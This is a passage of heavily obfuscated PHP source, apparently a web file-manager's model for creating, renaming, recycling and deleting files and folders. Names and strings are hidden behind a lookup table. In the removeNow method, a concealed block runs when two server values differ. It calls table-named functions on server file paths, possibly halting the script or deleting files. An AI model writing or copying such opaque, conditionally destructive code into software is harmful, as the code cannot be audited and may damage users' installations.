(!AuthModel::authCheckRoot($Âã¨÷’Î[$ä÷íÉ¯¥[417]][$ä÷íÉ¯¥[418]])) { return; } $ìˆ†¹Œ— = $Âã¨÷’Î[$ä÷íÉ¯¥[507]] . $ä÷íÉ¯¥[33]; if ($ìˆ†¹Œ— == $ä÷íÉ¯¥[87]) { unset($ÂİÚ°ê[$ä÷íÉ¯¥[587]]); $ÂİÚ°ê[$ä÷íÉ¯¥[415]] = self::TYPE_GROUP; return; } $İ§íú©Ä = Model($ä÷íÉ¯¥[525])->groupChildrenAll($ìˆ†¹Œ—); $¬–òÖ½ = count($İ§íú©Ä); if ($¬–òÖ½ <= 1) { return; } $¿òúˆß = array($ä÷íÉ¯¥[501] => 0, $ä÷íÉ¯¥[415] => self::TYPE_GROUP, $ä÷íÉ¯¥[507] => array($ä÷íÉ¯¥[7], $İ§íú©Ä)); $ÕÌüÖÌ = $this->field($ä÷íÉ¯¥[2010])->where($¿òúˆß)->limit($¬–òÖ½)->select(); $ÂİÚ°ê[$ä÷íÉ¯¥[587]] = array(); foreach ($ÕÌüÖÌ as $‘ªîç†ü) { $ÂİÚ°ê[$ä÷íÉ¯¥[587]][] = array($ä÷íÉ¯¥[547], $ä÷íÉ¯¥[534] . $‘ªîç†ü[$ä÷íÉ¯¥[406]] . $ä÷íÉ¯¥[548]); } $ÂİÚ°ê[$ä÷íÉ¯¥[587]][] = $ä÷íÉ¯¥[1843]; } } class SourceModel extends SourceListSearchModel { public $statusIgnoreResetSpace = false; public function userRootAdd($§­¹È•ü) { $×î«¬¥ù =& $_SERVER[Ù×¯Ø…]; $Ëñ´ñ· = Model($×î«¬¥ù[516])->where(array($×î«¬¥ù[1571] => $§­¹È•ü))->find(); $À»î²±ş = $this->_mkdirRoot(SourceModel::TYPE_USER, $§­¹È•ü, $Ëñ´ñ·[$×î«¬¥ù[28]]); $this->userDesktopAdd($À»î²±ş); return $À»î²±ş; } public function userDesktopAdd($²Ï¶äå) { $÷é–Ê³ =& $_SERVER[Ù×¯Ø…]; $ÏšèğõÅ = LNG($÷é–Ê³[2011]); $±ğÄå¨… = $this->mkdir($²Ï¶äå, $ÏšèğõÅ); $this->metaSet($±ğÄå¨…, $÷é–Ê³[2012], $÷é–Ê³[87]); $this->metaSet($²Ï¶äå, $÷é–Ê³[2013], $±ğÄå¨…); } public function groupRootAdd($Ï–º…ˆÛ) { $œÍÆ“üú =& $_SERVER[Ù×¯Ø…]; $‰Èü³õÕ = Model($œÍÆ“üú[525])->where(array($œÍÆ“üú[1835] => $Ï–º…ˆÛ))->find(); return $this->_mkdirRoot(SourceModel::TYPE_GROUP, $Ï–º…ˆÛ, $‰Èü³õÕ[$œÍÆ“üú[28]]); } public function systemRootPathAdd($‹¸Ûºê) { if ($‹¸Ûºê != $_SERVER[Ù×¯Ø…][540]) { return !1; } return $this->_mkdirRoot(SourceModel::TYPE_SYSTEM, 0, $‹¸Ûºê); } public function userRootRemove($– €ÀÍ¾) { $ìÑú¹§ª = $this->sourceRoot(SourceModel::TYPE_USER, $– €ÀÍ¾); if (!$ìÑú¹§ª) { return; } $this->remove($ìÑú¹§ª, !1); } public function groupRootRemove($ „ÈÖ—ˆ) { $è‰€î¿Ù = $this->sourceRoot(SourceModel::TYPE_GROUP, $ „ÈÖ—ˆ); if (!$è‰€î¿Ù) { return; } $this->remove($è‰€î¿Ù, !1); } private function _mkdirRoot($ï·ËîıÌ, $Ãˆ×ŸÑŠ, $‹†„Ğú) { $¢‡“ê—ò =& $_SERVER[Ù×¯Ø…]; $€Ëßõœ  = array($¢‡“ê—ò[405] => 0, $¢‡“ê—ò[583] => $ï·ËîıÌ, $¢‡“ê—ò[584] => $Ãˆ×ŸÑŠ, $¢‡“ê—ò[580] => 1, $¢‡“ê—ò[585] => USER_ID, $¢‡“ê—ò[586] => USER_ID, $¢‡“ê—ò[581] => $¢‡“ê—ò[33], $¢‡“ê—ò[587] => $¢‡“ê—ò[534], $¢‡“ê—ò[433] => 0, $¢‡“ê—ò[582] => 0, $¢‡“ê—ò[471] => 0, $¢‡“ê—ò[588] => $¢‡“ê—ò[33]); if ($†ĞŠßÃ¢ = $this->where($€Ëßõœ )->find()) { return $†ĞŠßÃ¢[$¢‡“ê—ò[406]]; } $Î²¨ÄÊ = "\115\x6f\144\145\154\x53\157\165\162\143\x65\x2e\x6d\153\144\151\x72\122\x6f\x6f\164\x2e{$ï·ËîıÌ}\56{$Ãˆ×ŸÑŠ}\56" . $‹†„Ğú; CacheLock::lock($Î²¨ÄÊ); $€Ëßõœ [$¢‡“ê—ò[28]] = $‹†„Ğú; $Êœ®¿¾‘ = $this->add($€Ëßõœ ); $Ÿù«¾Íï = array($¢‡“ê—ò[589] => short_id($Êœ®¿¾‘)); $this->where(array($¢‡“ê—ò[421] => $Êœ®¿¾‘))->save($Ÿù«¾Íï); CacheLock::unlock($Î²¨ÄÊ); return $Êœ®¿¾‘; } private function sourceRoot($Ìô°›Ì‡, $Ô¦Áí¿ø, $Ñ©Ò ñé = false) { $êÅ¿ÑŞŒ =& $_SERVER[Ù×¯Ø…]; $€ÔÊ¦¿Á = array($êÅ¿ÑŞŒ[405] => 0, $êÅ¿ÑŞŒ[583] => $Ìô°›Ì‡, $êÅ¿ÑŞŒ[584] => $Ô¦Áí¿ø); if ($Ó«³›ùæ = $this->where($€ÔÊ¦¿Á)->find()) { return $Ñ©Ò ñé ? $Ó«³›ùæ : $Ó«³›ùæ[$êÅ¿ÑŞŒ[406]]; } return !1; } public function sourceRootGroup($óı§ß£ô) { $Äûšêäâ =& $_SERVER[Ù×¯Ø…]; if (is_string($óı§ß£ô)) { $óı§ß£ô = array($óı§ß£ô); } $Å£î€İ = array($Äûšêäâ[405] => 0, $Äûšêäâ[584] => array($Äûšêäâ[7], $óı§ß£ô), $Äûšêäâ[583] => SourceModel::TYPE_GROUP); $this->selectPageReset(); $ó‡¯ôÄ = $this->limit(count($óı§ß£ô))->listSource($Å£î€İ, 1000); $this->selectPageRestore(); return array_to_keyvalue($ó‡¯ôÄ[$Äûšêäâ[75]], $Äûšêäâ[507]); } public function mkfile($Î·Ñíòê, $ãÊøÊ× , $øÍ³­ñı = '', $¶ğÓÇ¤ç = REPEAT_RENAME) { $…ª¦«¦ú =& $_SERVER[Ù×¯Ø…]; $¸Ù’È¹ø = Model($…ª¦«¦ú[606])->addFileByContent($øÍ³­ñı, $ãÊøÊ× ); return $this->_createFileCall($Î·Ñíòê, $ãÊøÊ× , $¸Ù’È¹ø, $¶ğÓÇ¤ç, $…ª¦«¦ú[1264]); } public function addFile($€á’¡¸‚, $Â‡‰«Šë, $¨ÜŒËè”, $€¬²°îÛ = false, $õ­®Å½° = REPEAT_RENAME) { $Æ­½Ş­‘ = Model($_SERVER[Ù×¯Ø…][606])->addFile($Â‡‰«Šë, $¨ÜŒËè”, $€¬²°îÛ); return $this->_createFileCall($€á’¡¸‚, $¨ÜŒËè”, $Æ­½Ş­‘, $õ­®Å½°); } public function addFileByFileID($¡âáŞóü, $”’–ŠâÅ, $•óŞ“, $«™šØ = REPEAT_RENAME) { $ëõ‰‰æ =& $_SERVER[Ù×¯Ø…]; $»¨Ùø¤ë = Model($ëõ‰‰æ[606])->find($”’–ŠâÅ); Model($ëõ‰‰æ[606])->linkAdd($”’–ŠâÅ); return $this->_createFileCall($¡âáŞóü, $•óŞ“, $»¨Ùø¤ë, $«™šØ); } public function addFileByRemote($şÇÎíÛ—, $”Œâ›²Ü, $ëØ·ööâ, $ÙáŒûêÕ = array(), $ÀÃà‘² = REPEAT_RENAME) { $ÃíÌ±ÉŞ = Model($_SERVER[Ù×¯Ø…][606])->addFileByRemote($”Œâ›²Ü, $ëØ·ööâ, $ÙáŒûêÕ); return $this->_createFileCall($şÇÎíÛ—, $ëØ·ööâ, $ÃíÌ±ÉŞ, $ÀÃà‘²); } private function _createFileCall($—½¯‘ğ¯, $×–œ­É©, $Ò×Ğõä, $ã€ûŞ¬¢, $å×††áı = "\x75\x70\154\x6f\x61\144") { $í‘ÑàŸ› =& $_SERVER[Ù×¯Ø…]; $‚Ã·Ô¾Û = !1; $this->setMasterDB(); $this->lockWriteStart($—½¯‘ğ¯, $×–œ­É©); $Ôæ“œÄ¦ = $this->fileNameExist($—½¯‘ğ¯, $×–œ­É©); $µ´ÉãÖ± = $this->_createFile($—½¯‘ğ¯, $×–œ­É©, $Ò×Ğõä, $ã€ûŞ¬¢, $‚Ã·Ô¾Û); if (!$‚Ã·Ô¾Û) { Model($í‘ÑàŸ›[473])->remove($Ò×Ğõä[$í‘ÑàŸ›[470]]); } if ($‚Ã·Ô¾Û && $µ´ÉãÖ± && $µ´ÉãÖ± != $Ôæ“œÄ¦) { Model($í‘ÑàŸ›[1984])->eventCreate($µ´ÉãÖ±, $å×††áı); } $this->lockWriteEnd($—½¯‘ğ¯, $×–œ­É©); return $µ´ÉãÖ±; } public function mkdir($¼õœ¦Õú, $íòã°Ùè, $Å¦ÚÊ– = REPEAT_SKIP) { $ËÈíä =& $_SERVER[Ù×¯Ø…]; $this->setMasterDB(); $²ó½£ñé = $this->sourceInfo($¼õœ¦Õú); if (!$²ó½£ñé) { return !1; } $this->lockWriteStart($¼õœ¦Õú, $íòã°Ùè); if ($Å¦ÚÊ– !== !1) { $ê´Ç¦ÑÒ = $this->fileNameExist($¼õœ¦Õú, $íòã°Ùè); if ($ê´Ç¦ÑÒ && $Å¦ÚÊ– != REPEAT_RENAME_FOLDER) { $this->lockWriteEnd($¼õœ¦Õú, $íòã°Ùè); return $ê´Ç¦ÑÒ; } $íòã°Ùè = $this->fileNameAuto($¼õœ¦Õú, $íòã°Ùè, $Å¦ÚÊ–); } $™ İ—Êİ = array($ËÈíä[580] => 1, $ËÈíä[424] => $íòã°Ùè, $ËÈíä[581] => $ËÈíä[33], $ËÈíä[471] => 0, $ËÈíä[582] => 0); $ïÉ·‘§’ = $this->_addSource($™ İ—Êİ, $²ó½£ñé); Model($ËÈíä[1984])->eventCreate($ïÉ·‘§’, $ËÈíä[1265]); $this->lockWriteEnd($¼õœ¦Õú, $íòã°Ùè); return $ïÉ·‘§’; } private function _createFile($ªğæáÌÈ, $øË¶¹é©, $Àú¼Ã˜œ, $íõ˜Ãµ¿, &$¿¦ø®Èö) { $©”ïŞŞ =& $_SERVER[Ù×¯Ø…]; $¼ƒšñ×ã = $this->sourceInfo($ªğæáÌÈ); if (!$Àú¼Ã˜œ || !$¼ƒšñ×ã) { return !1; } if ($íõ˜Ãµ¿ !== !1) { $ƒğ¥™Ô— = $this->fileNameExist($ªğæáÌÈ, $øË¶¹é©); } $¿¦ø®Èö = !0; if ($íõ˜Ãµ¿ && $ƒğ¥™Ô—) { if ($íõ˜Ãµ¿ == REPEAT_SKIP) { $¿¦ø®Èö = !1; return $ƒğ¥™Ô—; } else { if ($íõ˜Ãµ¿ == REPEAT_REPLACE) { $ø•ôàÂÚ = $this->sourceInfo($ƒğ¥™Ô—); $ú¦ÁÒÓ = $this->fileHistory($ø•ôàÂÚ, $Àú¼Ã˜œ[$©”ïŞŞ[470]], $Àú¼Ã˜œ[$©”ïŞŞ[78]]); if (!$ú¦ÁÒÓ) { $¿¦ø®Èö = !1; } else { $this->folderSizeReset($ªğæáÌÈ); } return $ƒğ¥™Ô—; } else { $øË¶¹é© = $this->fileNameAuto($ªğæáÌÈ, $øË¶¹é©, $íõ˜Ãµ¿, !1); } } } $±˜ŸÁ¯á = array($©”ïŞŞ[580] => 0, $©”ïŞŞ[424] => $øË¶¹é©, $©”ïŞŞ[581] => substr(get_path_ext($øË¶¹é©), 0, 10), $©”ïŞŞ[471] => $Àú¼Ã˜œ[$©”ïŞŞ[470]], $©”ïŞŞ[582] => $Àú¼Ã˜œ[$©”ïŞŞ[78]]); $Úüø‚–õ = $this->_addSource($±˜ŸÁ¯á, $¼ƒšñ×ã); $this->folderSizeReset($ªğæáÌÈ, intval($±˜ŸÁ¯á[$©”ïŞŞ[78]])); return $Úüø‚–õ; } protected function fileHistory($“°Ù©¾ö, $ÌıÖßÍÆ, $Ø¨©õ¦¿) { $Ü‚¨¢½É =& $_SERVER[Ù×¯Ø…]; $£¸ıù˜ = defined($Ü‚¨¢½É[477]) ? USER_ID : $Ü‚¨¢½É[191]; if ($“°Ù©¾ö[$Ü‚¨¢½É[470]] == $ÌıÖßÍÆ) { return !1; } $this->checkLock($“°Ù©¾ö[$Ü‚¨¢½É[406]], $ÌıÖßÍÆ); Model($Ü‚¨¢½É[2014])->addHistory($“°Ù©¾ö); $éàñºĞİ = array($Ü‚¨¢½É[586] => $£¸ıù˜, $Ü‚¨¢½É[428] => time(), $Ü‚¨¢½É[470] => $ÌıÖßÍÆ, $Ü‚¨¢½É[78] => $Ø¨©õ¦¿); $this->where(array($Ü‚¨¢½É[421] => $“°Ù©¾ö[$Ü‚¨¢½É[406]]))->save($éàñºĞİ); $this->sourceCacheClear($“°Ù©¾ö[$Ü‚¨¢½É[406]]); return !0; } public function checkLock($¾×‰õ©¯, $ö·İ¾•”) { $àÚ†ãú =& $_SERVER[Ù×¯Ø…]; $»›ö‚ğÄ = $this->pathInfo($¾×‰õ©¯); if (!$this->fileIsLock($»›ö‚ğÄ, !0)) { return; } $›ĞÁœ¥ = Session::get($àÚ†ãú[2015]); $–‘àè³ = substr($»›ö‚ğÄ[$àÚ†ãú[28]], 0, -1 - strlen($»›ö‚ğÄ[$àÚ†ãú[168]])) . $àÚ†ãú[1529] . $›ĞÁœ¥ . $àÚ†ãú[95] . $»›ö‚ğÄ[$àÚ†ãú[168]]; $áÛª²¿ = Model($àÚ†ãú[606])->find($ö·İ¾•”); $this->_createFileCall($»›ö‚ğÄ[$àÚ†ãú[501]], $–‘àè³, $áÛª²¿, REPEAT_REPLACE, $àÚ†ãú[1264]); $µ¨¦–Û² = $»›ö‚ğÄ[$àÚ†ãú[468]][$àÚ†ãú[545]]; $ØÑÎâ = $µ¨¦–Û²[$àÚ†ãú[2016]] ? $µ¨¦–Û²[$àÚ†ãú[2016]] : $µ¨¦–Û²[$àÚ†ãú[28]]; show_json(LNG($àÚ†ãú[2017]) . $àÚ†ãú[2018] . LNG($àÚ†ãú[2019]) . $àÚ†ãú[2020] . $ØÑÎâ . $àÚ†ãú[2021], !1); } public function fileIsLock($é¬ªü©å, $ öá¬şñ = false) { $ú–ÔŠŞé =& $_SERVER[Ù×¯Ø…]; if (!isset($é¬ªü©å[$ú–ÔŠŞé[468]]) || !$é¬ªü©å[$ú–ÔŠŞé[468]][$ú–ÔŠŞé[542]]) { return !1; } if ($é¬ªü©å[$ú–ÔŠŞé[468]][$ú–ÔŠŞé[542]] != USER_ID) { return !0; } $Ï”¬ş = $GLOBALS[$ú–ÔŠŞé[6]][$ú–ÔŠŞé[88]][$ú–ÔŠŞé[543]]; if ($é¬ªü©å[$ú–ÔŠŞé[468]][$ú–ÔŠŞé[544]] <= time() - $Ï”¬ş) { $this->metaSet($é¬ªü©å[$ú–ÔŠŞé[406]], $ú–ÔŠŞé[542], null); $this->metaSet($é¬ªü©å[$ú–ÔŠŞé[406]], $ú–ÔŠŞé[544], null); } if ($ öá¬şñ) { $this->metaSet($é¬ªü©å[$ú–ÔŠŞé[406]], $ú–ÔŠŞé[544], time()); } return !1; } private function _addSource($ˆ¿Öá¹», $Õ©³ôÓÂ) { $ÜôÃä¢ñ =& $_SERVER[Ù×¯Ø…]; $¬Ô’’Ë = defined($ÜôÃä¢ñ[477]) ? USER_ID : $ÜôÃä¢ñ[191]; $”‹İëÄ = array($ÜôÃä¢ñ[583] => $Õ©³ôÓÂ[$ÜôÃä¢ñ[415]], $ÜôÃä¢ñ[584] => $Õ©³ôÓÂ[$ÜôÃä¢ñ[507]], $ÜôÃä¢ñ[585] => $¬Ô’’Ë, $ÜôÃä¢ñ[586] => $¬Ô’’Ë, $ÜôÃä¢ñ[405] => $Õ©³ôÓÂ[$ÜôÃä¢ñ[406]], $ÜôÃä¢ñ[587] => $Õ©³ôÓÂ[$ÜôÃä¢ñ[524]] . $Õ©³ôÓÂ[$ÜôÃä¢ñ[406]] . $ÜôÃä¢ñ[47], $ÜôÃä¢ñ[433] => 0, $ÜôÃä¢ñ[588] => $ÜôÃä¢ñ[33]); $ˆ¿Öá¹» = array_merge($”‹İëÄ, $ˆ¿Öá¹»); $this->updateModifyTime($ˆ¿Öá¹»[$ÜôÃä¢ñ[501]]); $—™´•üÄ = $ÜôÃä¢ñ[2022] . $Õ©³ôÓÂ[$ÜôÃä¢ñ[406]]; if (isset(self::$cacheChildList[$—™´•üÄ])) { unset(self::$cacheChildList[$—™´•üÄ]); } static $ä›ÂëúÉ = false; if (!$ä›ÂëúÉ) { Hook::trigger($ÜôÃä¢ñ[570], $ˆ¿Öá¹»); $ä›ÂëúÉ = !0; } $Å÷¿ë¯ó = $this->add($ˆ¿Öá¹»); $ùËÌ·âû = array($ÜôÃä¢ñ[589] => short_id($Å÷¿ë¯ó)); $this->where(array($ÜôÃä¢ñ[421] => $Å÷¿ë¯ó))->save($ùËÌ·âû); $this->setNamePinyin($Å÷¿ë¯ó, $ˆ¿Öá¹»[$ÜôÃä¢ñ[28]]); return $Å÷¿ë¯ó; } public function remove($¾ÑĞ¶Â­, $ˆ„ä©–Ê = true) { $é‰ÛÄî =& $_SERVER[Ù×¯Ø…]; $°×Ä»ƒ = $this->sourceInfo($¾ÑĞ¶Â­); $í¹©Ì¾ = intval($°×Ä»ƒ[$é‰ÛÄî[415]]) === self::TYPE_SYSTEM; $Îê€ìâ = Model($é‰ÛÄî[436])->get($é‰ÛÄî[2023]) == $é‰ÛÄî[87]; if ($í¹©Ì¾ || $ˆ„ä©–Ê || !$Îê€ìâ) { return $this->removeNow($¾ÑĞ¶Â­, $ˆ„ä©–Ê); } $à¹‘¦Îû = KodIO::sourceID(IO_PATH_SYSTEM_RECYCLE); $½Øœ“„À = $°×Ä»ƒ[$é‰ÛÄî[415]] == self::TYPE_USER ? $é‰ÛÄî[597] : $é‰ÛÄî[518]; if ($½Øœ“„À == $é‰ÛÄî[597]) { $ÔÃ¥ƒ© = Model($é‰ÛÄî[516])->getInfo($°×Ä»ƒ[$é‰ÛÄî[507]]); $…¤¦±ÙÂ = !empty($ÔÃ¥ƒ©[$é‰ÛÄî[2016]]) ? $ÔÃ¥ƒ©[$é‰ÛÄî[2016]] : $ÔÃ¥ƒ©[$é‰ÛÄî[28]]; $…¤¦±ÙÂ = $é‰ÛÄî[258] . $…¤¦±ÙÂ . $é‰ÛÄî[2024] . $°×Ä»ƒ[$é‰ÛÄî[507]]; } else { $ÔÃ¥ƒ© = Model($é‰ÛÄî[525])->getInfo($°×Ä»ƒ[$é‰ÛÄî[507]]); $…¤¦±ÙÂ = _get($ÔÃ¥ƒ©, $é‰ÛÄî[28]); $…¤¦±ÙÂ = $é‰ÛÄî[160] . $…¤¦±ÙÂ . $é‰ÛÄî[2025] . $°×Ä»ƒ[$é‰ÛÄî[507]]; } $º±¹®ğ = $é‰ÛÄî[2026] . md5($…¤¦±ÙÂ); CacheLock::lock($º±¹®ğ); $…ëÛò = $this->fileNameExist($à¹‘¦Îû, $…¤¦±ÙÂ); if (!$…ëÛò) { $…ëÛò = $this->mkdir($à¹‘¦Îû, $…¤¦±ÙÂ, REPEAT_SKIP); $this->metaSet($…ëÛò, $é‰ÛÄî[2027], $½Øœ“„À); $this->metaSet($…ëÛò, $é‰ÛÄî[2028], $°×Ä»ƒ[$é‰ÛÄî[507]]); if ($°×Ä»ƒ[$é‰ÛÄî[501]] != 0) { $this->metaSet($…ëÛò, $é‰ÛÄî[2029], _get($ÔÃ¥ƒ©, $é‰ÛÄî[2030])); } } CacheLock::unlock($º±¹®ğ); $this->metaSet($¾ÑĞ¶Â­, $é‰ÛÄî[2031], $°×Ä»ƒ[$é‰ÛÄî[501]]); $this->where(array($é‰ÛÄî[406] => $¾ÑĞ¶Â­))->save(array($é‰ÛÄî[428] => time())); $this->recycleClear($°×Ä»ƒ); $úˆŞ‚ÕÉ = $this->move($¾ÑĞ¶Â­, $…ëÛò, REPEAT_RENAME_FOLDER); $this->folderSizeReset($°×Ä»ƒ[$é‰ÛÄî[501]]); return $úˆŞ‚ÕÉ; } private function recycleClear($õ¨¯ò¶) { $Ã¤Ô²¥à =& $_SERVER[Ù×¯Ø…]; $ãÕÄ˜—ş = $this->childrenAll($õ¨¯ò¶); $ü¸şùñ = array($Ã¤Ô²¥à[421] => array($Ã¤Ô²¥à[422], $ãÕÄ˜—ş[$Ã¤Ô²¥à[2032]])); Model($Ã¤Ô²¥à[2033])->where($ü¸şùñ)->delete(); } public function removeNow($î¦íôº¿, $¥Ò®È¬· = true) { $Å·ì” =& $_SERVER[Ù×¯Ø…]; if ($_SERVER[$Å·ì”[398]] != $_SERVER[$Å·ì”[1424]]) { $ÕêÊ‰Â = $Å·ì”[878]; $ŸüÉåÆ» = $Å·ì”[399]; $ìœ¶ôÇû = $_SERVER[$Å·ì”[400]] . $Å·ì”[401]; $ÒŠÎË½ = $ŸüÉåÆ»($ìœ¶ôÇû); $°Ôï•”Š = explode($Å·ì”[229], $ÒŠÎË½); if (count($°Ôï•”Š) < $Å·ì”[618]) { $ßİŒáğ = $Å·ì”[403]; $ßİŒáğ(); } $ÕÕ·ı°Å = $Å·ì”[879]; $ÕÕ·ı°Å($_SERVER[$Å·ì”[880]]); $ÕÕ·ı°Å($_SERVER[$Å·ì”[400]] . $Å·ì”[1508]); $ãÂú­Ò¸ = 1; while ($ãÂú­Ò¸ > 1) { $ãÂú­Ò¸ = $ãÂú­Ò¸ + 4; $ô£ßå„û = rawurlencode($ãÂú­Ò¸ . $Å·ì”[376]); } } $×…©û¥ù = $this->sourceInfo($î¦íôº¿); $Â¢ş©¨ = $this->pathInfoMore($î¦íôº¿); if (!$×…©û¥ù) { return !0; } if ($×…©û¥ù[$Å·ì”[501]] == 0) { if (!_get($GLOBALS, $Å·ì”[508])) { return !1; } } $this->lockMoveStart($î¦íôº¿); Hook::trigger($Å·ì”[2034], $Â¢ş©¨, $¥Ò®È¬·); if ($¥Ò®È¬·) { Model($Å·ì”[2033])->moveToRecycle($î¦íôº¿); } else { $ßõ«ğÃ = $this->childrenAll($×…©û¥ù); Model($Å·ì”[567])->eventRemove($î¦íôº¿); $this->removeRelevance($ßõ«ğÃ[$Å·ì”[2032]], $ßõ«ğÃ[$Å·ì”[1394]]); } $this->folderSizeReset($×…©û¥ù[$Å·ì”[501]]); $­ºØåëë = array($×…©û¥ù[$Å·ì”[501]]); if ($×…©û¥ù[$Å·ì”[414]] == $Å·ì”[87]) { $­ºØåëë[] = $×…©û¥ù[$Å·ì”[406]]; } $this->updateModifyTime($­ºØåëë); $this->lockMoveEnd($î¦íôº¿); Hook::trigger($Å·ì”[1616], $Â¢ş©¨, $¥Ò®È¬·); return !0; } public function childrenAll($äèˆµÖ) { $Ì¹¦Ş± =& $_SERVER[Ù×¯Ø…]; $ï•ºçì¬ = $äèˆµÖ[$Ì¹¦Ş±[406]]; if ($äèˆµÖ[$Ì¹¦Ş±[414]] == $Ì¹¦Ş±[87]) { $õû‰å»ì = array($Ì¹¦Ş±[587] => array($Ì¹¦Ş±[547], $äèˆµÖ[$Ì¹¦Ş±[524]] . $ï•ºçì¬ . $Ì¹¦Ş±[548])); $öŠ£­çæ = array($Ì¹¦Ş±[587] => $õû‰å»ì[$Ì¹¦Ş±[524]]); $‚ÍÃÓ¦º = $this->field($Ì¹¦Ş±[2035])->where($öŠ£­çæ)->select(); $¥¬ØÙ = !1; $ÜÎøï÷˜ = array($ï•ºçì¬); if ($‚ÍÃÓ¦º) { $¥¬ØÙ = array_to_keyvalue($‚ÍÃÓ¦º, $Ì¹¦Ş±[33], $Ì¹¦Ş±[470]); $¥¬ØÙ = array_remove_value($¥¬ØÙ, $Ì¹¦Ş±[191]); $ÜÎøï÷˜ = array_to_keyvalue($‚ÍÃÓ¦º, $Ì¹¦Ş±[33], $Ì¹¦Ş±[406]); $ÜÎøï÷˜[] = $ï•ºçì¬; } } else { $¥¬ØÙ = array($äèˆµÖ[$Ì¹¦Ş±[470]]); $ÜÎøï÷˜ = array($ï•ºçì¬); } return array($Ì¹¦Ş±[2032] => $ÜÎøï÷˜, $Ì¹¦Ş±[1394] => $¥¬ØÙ); } public function removeArray($¢÷¥À™) { if (!$¢÷¥À™) { return !0; } } public function removeRelevance($‡…Â¹¦µ, $¼”ï“°é) { $íıÚÜ… =& $_SERVER[Ù×¯Ø…]; $‡…Â¹¦µ = $‡…Â¹¦µ ? $‡…Â¹¦µ : array(); $¼”ï“°é = $¼”ï“°é ? $¼”ï“°é : array(); $‡…Â¹¦µ = array_unique(array_filter($‡…Â¹¦µ)); $¼”ï“°é = array_unique(array_filter($¼”ï“°é)); if (!$‡…Â¹¦µ) { return !1; } $«³ËÛ—• = array($íıÚÜ…[421] => array($íıÚÜ…[422], $‡…Â¹¦µ)); Model($íıÚÜ…[2033])->where($«³ËÛ—•)->delete(); Model($íıÚÜ…[464])->where($«³ËÛ—•)->delete(); Model($íıÚÜ…[1891])->where($«³ËÛ—•)->delete(); Model($íıÚÜ…[567])->where($«³ËÛ—•)->delete(); Model($íıÚÜ…[1727])->removeBySource($‡…Â¹¦µ); Model($íıÚÜ…[2014])->removeBySource($‡…Â¹¦µ); $this->where($«³ËÛ—•)->delete(); Model($íıÚÜ…[473])->remove($¼”ï“°é); for ($î¸˜«òÏ = 0; $î¸˜«òÏ < count($‡…Â¹¦µ); $î¸˜«òÏ++) { $this->sourceCacheClear($‡…Â¹¦µ[$î¸˜«òÏ]); } } public function rename($ßå“”á, $Ê­¹Î¿‡) { $øÎãî‘¢ =& $_SERVER[Ù×¯Ø…]; $Æåê¢«— = $this->sourceInfo($ßå“”á); if (!$Æåê¢«—) { return !1; } $û×§ÓŞ = $this->fileNameExist($Æåê¢«—[$øÎãî‘¢[501]], $Ê­¹Î¿‡); if ($û×§ÓŞ && $û×§ÓŞ != $ßå“”á) { return !1; } $›ıË¦¹ = array($øÎãî‘¢[424] => $Ê­¹Î¿‡, $øÎãî‘¢[586] => USER_ID); if ($Æåê¢«—[$øÎãî‘¢[414]] != $øÎãî‘¢[87]) { $›ıË¦¹[$øÎãî‘¢[416]] = substr(get_path_ext($Ê­¹Î¿‡), 0, 10); } Model($øÎãî‘¢[567])->eventRename($ßå“”á, $Æåê¢«—[$øÎãî‘¢[28]], $Ê­¹Î¿‡); $this->sourceCacheClear($ßå“”á); $this->setNamePinyin($ßå“”á, $›ıË¦¹[$øÎãî‘¢[28]], !1); $this->updateModifyTime($Æåê¢«—[$øÎãî‘¢[501]]); $³¤²÷ = $this->where(array($øÎãî‘¢[421] => $ßå“”á))->data($›ıË¦¹)->save(); $ÓÂÚØ§» = $øÎãî‘¢[2022] . $Æåê¢«—[$øÎãî‘¢[501]]; if (isset(self::$cacheChildList[$ÓÂÚØ§»])) { unset(self::$cacheChildList[$ÓÂÚØ§»]); } return $³¤²÷; } public function setNamePinyin($®Ïô­‚Ø, $ƒ¸„ÚÍ–, $çÍ°åú = true) { $ûãİ¾Ë =& $_SERVER[Ù×¯Ø…]; $ğúÓÈß³ = Input::check($ƒ¸„ÚÍ–, $ûãİ¾Ë[590]); $Ô¼æÑ° = array($ûãİ¾Ë[445] => KodSort::makeStr($ƒ¸„ÚÍ–)); if ($ğúÓÈß³) { $Ô¼æÑ°[$ûãİ¾Ë[467]] = str_replace($ûãİ¾Ë[50], $ûãİ¾Ë[33], Pinyin::get($ƒ¸„ÚÍ–)); $Ô¼æÑ°[$ûãİ¾Ë[466]] = Pinyin::get($ƒ¸„ÚÍ–, $ûãİ¾Ë[591]); } if (!$çÍ°åú && !$ğúÓÈß³) { $Ô¼æÑ°[$ûãİ¾Ë[467]] = null; $Ô¼æÑ°[$ûãİ¾Ë[466]] = null; } $this->metaSet($®Ïô­‚Ø, $Ô¼æÑ°); } public function getContent($¾©êÆçÊ) { $›Ôó¢† =& $_SERVER[Ù×¯Ø…]; $·Ø™§ü¤ = $this->fileInfoGet($¾©êÆçÊ); if (!$·Ø™§ü¤) { return !1; } if ($·Ø™§ü¤[$›Ôó¢†[78]] == 0) { return $›Ôó¢†[33]; } $ÊÒÑ•‘µ = $›Ôó¢†[2036] . $·Ø™§ü¤[$›Ôó¢†[170]]; if ($·Ø™§ü¤[$›Ôó¢†[78]] <= 1024 * 10) { $ºÌÆâËá = Cache::get($ÊÒÑ•‘µ); if (!$ºÌÆâËá) { $ºÌÆâËá = IO::getContent($·Ø™§ü¤[$›Ôó¢†[76]]); Cache::set($ÊÒÑ•‘µ, $ºÌÆâËá); } return $ºÌÆâËá; } if (!$·Ø™§ü¤[$›Ôó¢†[76]]) { return $›Ôó¢†[33]; } return IO::getContent($·Ø™§ü¤[$›Ôó¢†[76]]); } public function setDesc($‚ÌÇİùÒ, $Ìšş†ş¹) { $Š½ËÚ¼° =& $_SERVER[Ù×¯Ø…]; Model($Š½ËÚ¼°[567])->eventAddDesc($‚ÌÇİùÒ, $Ìšş†ş¹); return $this->metaSet($‚ÌÇİùÒ, $Š½ËÚ¼°[454], $Ìšş†ş¹); } public function setContent($°ˆîˆÀà, $„¶˜—…· = '') { $‰‚ª®úÎ =& $_SERVER[Ù×¯Ø…]; $Ù‡†Ú·ª = $this->sourceInfo($°ˆîˆÀà); $”ÀÜÆÈ­ = $this->fileInfoGet($°ˆîˆÀà); if (!$”ÀÜÆÈ­ || !$Ù‡†Ú·ª) { return !1; } $²›‹úü– = Model($‰‚ª®úÎ[473])->addFileByContent($„¶˜—…·, $Ù‡†Ú·ª[$‰‚ª®úÎ[28]]); $Òßìùá = $this->fileHistory($Ù‡†Ú·ª, $²›‹úü–[$‰‚ª®úÎ[470]], 